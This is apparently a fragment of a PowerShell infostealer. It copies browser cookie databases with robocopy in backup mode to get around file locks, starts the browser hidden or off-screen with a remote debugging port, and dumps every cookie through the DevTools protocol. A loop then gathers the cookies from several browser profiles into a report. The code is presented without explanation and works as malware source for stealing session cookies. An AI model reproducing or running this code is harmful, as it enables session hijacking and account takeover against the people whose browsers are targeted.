function Cdp($exe,$dir,$port,$hl){
 $tmp=Join-Path $env:TEMP ([guid]::NewGuid().ToString('N'));$nd=Join-Path $tmp 'Network'
 New-Item -ItemType Directory $nd -Force|Out-Null
 Copy-Item "$dir\Local State" $tmp -EA 0
 robocopy "$dir\Network" $nd "Cookies" "Cookies-journal" /B /R:0 /W:0 /NJH /NJS /NFL /NDL|Out-Null
 if(-not(Test-Path "$nd\Cookies")){Remove-Item $tmp -Recurse -Force -EA 0;return $null}
 $a=@("--user-data-dir=$tmp","--remote-debugging-port=$port","--no-first-run","--no-default-browser-check","--disable-gpu")
 if($hl){$a+="--headless=new"}else{$a+="--window-position=-3000,-3000";$a+="--window-size=200,200"}
 $a+="about:blank"
 $pr=Start-Process $exe -ArgumentList $a -PassThru -WindowStyle Hidden
 $u=$null
 for($i=0;$i -lt 48;$i++){Start-Sleep -Milliseconds 250
  try{$u=(Invoke-RestMethod "http://127.0.0.1:$port/json/version" -TimeoutSec 2).webSocketDebuggerUrl;break}catch{}}
 if(-not $u){Stop-Process $pr -Force -EA 0;Remove-Item $tmp -Recurse -Force -EA 0;return $null}
 try{
  $ws=New-Object Net.WebSockets.ClientWebSocket;$ct=[Threading.CancellationToken]::None
  $ws.ConnectAsync([Uri]$u,$ct).Wait(8000)
  $s={param($x) New-Object ArraySegment[byte] -ArgumentList @(,[Text.Encoding]::UTF8.GetBytes($x))}
  $ws.SendAsync((& $s '{"id":1,"method":"Network.enable"}'),'Text',$true,$ct).Wait(8000)
  $ws.SendAsync((& $s '{"id":2,"method":"Network.getAllCookies"}'),'Text',$true,$ct).Wait(8000)
  $ms=New-Object IO.MemoryStream;$b=New-Object byte[] 262144;$t=''
  for($k=0;$k -lt 400;$k++){
   $r=$ws.ReceiveAsync((New-Object ArraySegment[byte] -ArgumentList @(,$b)),$ct).Result
   $ms.Write($b,0,$r.Count)
   if($r.EndOfMessage){$t=[Text.Encoding]::UTF8.GetString($ms.ToArray());if($t -match '"id":2'){break};$ms.SetLength(0)}}
  $ws.Dispose();return (ConvertFrom-Json $t).result.cookies
 }catch{return $null}
 finally{Stop-Process $pr -Force -EA 0;Remove-Item $tmp -Recurse -Force -EA 0}}

foreach($x in $targets){

 if(-not $c -or $c.Count -eq 0){$c=Cdp $proc.Path $x.d $port $false}

 [void]$all.AppendLine("### $($x.p) ($($c.Count))")

 [void]$all.AppendLine()}
